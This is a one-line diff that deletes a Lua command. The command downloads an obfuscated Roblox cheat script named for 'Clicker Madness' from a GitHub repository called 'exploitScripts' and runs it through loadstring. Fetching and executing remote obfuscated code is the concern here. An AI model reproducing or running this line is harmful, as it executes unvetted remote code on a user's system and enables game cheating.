@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Ducks-Scripts/exploitScripts/main/Clicker%20Madness%20GUI%20Obfuscated.lua"))()
